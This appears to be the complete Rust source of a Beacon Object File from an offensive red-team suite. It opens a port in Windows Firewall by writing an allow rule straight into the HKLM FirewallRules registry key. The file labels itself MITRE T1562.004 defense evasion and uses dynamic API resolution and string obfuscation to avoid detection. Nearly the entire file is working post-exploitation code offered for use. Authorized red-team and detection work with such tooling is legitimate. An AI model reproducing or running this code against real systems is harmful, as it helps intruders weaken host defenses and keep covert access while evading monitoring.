// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
//! Add a Windows Firewall rule via direct registry write.
//!
//! Writes a value under:
//!   HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\
//!     FirewallPolicy\FirewallRules
//!
//! Rule value format:
//!   v2.30|Action=Allow|Active=TRUE|Dir=IN|Protocol=6|LPort=PORT|Name=RULENAME|
//!
//! Args: <rulename> <port> <protocol: tcp|udp> <direction: in|out>
//!
//! MITRE ATT&CK: T1562.004 (Disable or Modify System Firewall)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1562.004",
        name: "Disable or Modify System Firewall",
        tactic: "Defense Evasion",
    },
];

const HKEY_LOCAL_MACHINE: isize = 0x8000_0002u32 as i32 as isize;
const KEY_WRITE: u32 = 0x20006;
const REG_SZ: u32 = 1;

dfr_fn!(
    reg_open_key_ex_a(
        hkey: isize, subkey: *const i8, options: u32,
        sam_desired: u32, result: *mut isize,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegOpenKeyExA"
);

dfr_fn!(
    reg_set_value_ex_a(
        hkey: isize, value_name: *const i8, reserved: u32,
        ty: u32, data: *const u8, data_len: u32,
    ) -> u32,
    module = "advapi32.dll",
    api    = "RegSetValueExA"
);

dfr_fn!(
    reg_close_key(hkey: isize) -> u32,
    module = "advapi32.dll",
    api    = "RegCloseKey"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let rulename = String::from(parser.get_str());
    let port     = String::from(parser.get_str());
    let protocol = String::from(parser.get_str());
    let direction = String::from(parser.get_str());

    if rulename.is_empty() || port.is_empty() {
        return Err("usage: add-firewall-rule <rulename> <port> <tcp|udp> <in|out>");
    }
    if rulename.len() > 128 { return Err("rulename too long"); }
    if port.len() > 8       { return Err("port value too long"); }

    // Protocol number: TCP=6, UDP=17
    let proto_num: &str = if protocol.eq_ignore_ascii_case("udp") { "17" } else { "6" };

    // Direction: IN or OUT
    let dir_str: &str = if direction.eq_ignore_ascii_case("out") { "OUT" } else { "IN" };

    // Build value data string:
    // v2.30|Action=Allow|Active=TRUE|Dir=IN|Protocol=6|LPort=PORT|Name=RULENAME|
    // Max size: ~200 bytes — safe on stack
    let mut val_buf = [0u8; 512];
    let mut vlen = 0usize;

    fn push_str(buf: &mut [u8], pos: &mut usize, s: &str) {
        for b in s.bytes() {
            if *pos + 1 < buf.len() { buf[*pos] = b; *pos += 1; }
        }
    }

    obf! { let prefix = "v2.30|Action=Allow|Active=TRUE|Dir="; }
    push_str(&mut val_buf, &mut vlen, prefix);
    push_str(&mut val_buf, &mut vlen, dir_str);

    obf! { let proto_part = "|Protocol="; }
    push_str(&mut val_buf, &mut vlen, proto_part);
    push_str(&mut val_buf, &mut vlen, proto_num);

    // Use LPort for inbound, RPort for outbound
    let port_key = if dir_str == "IN" { "|LPort=" } else { "|RPort=" };
    push_str(&mut val_buf, &mut vlen, port_key);
    push_str(&mut val_buf, &mut vlen, port.as_str());

    obf! { let name_part = "|Name="; }
    push_str(&mut val_buf, &mut vlen, name_part);
    push_str(&mut val_buf, &mut vlen, rulename.as_str());
    push_str(&mut val_buf, &mut vlen, "|");
    // NUL-terminate for REG_SZ
    if vlen < val_buf.len() { val_buf[vlen] = 0; vlen += 1; }

    // Registry key path (obfuscated)
    obf! { let key_path = "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules"; }
    let mut key_cstr = [0i8; 192];
    for (i, b) in key_path.bytes().enumerate() {
        if i + 1 < key_cstr.len() { key_cstr[i] = b as i8; }
    }

    // Value name = rulename
    let mut name_cstr = [0i8; 132];
    for (i, b) in rulename.bytes().enumerate() {
        if i + 1 < name_cstr.len() { name_cstr[i] = b as i8; }
    }

    let mut hkey: isize = 0;
    let rc = unsafe {
        reg_open_key_ex_a(HKEY_LOCAL_MACHINE, key_cstr.as_ptr(), 0, KEY_WRITE, &mut hkey)
    }.map_err(|_| "resolve failed")?;

    if rc != 0 {
        return Err("registry key open failed");
    }

    let rc2 = unsafe {
        reg_set_value_ex_a(
            hkey,
            name_cstr.as_ptr(),
            0,
            REG_SZ,
            val_buf.as_ptr(),
            vlen as u32,
        )
    }.map_err(|_| "resolve failed")?;

    let _ = unsafe { reg_close_key(hkey) };

    if rc2 != 0 {
        return Err("registry write failed");
    }

    println!("[+] firewall rule added: {} (port {}, {}/{})", rulename, port, proto_num, dir_str);
    Ok(())
}
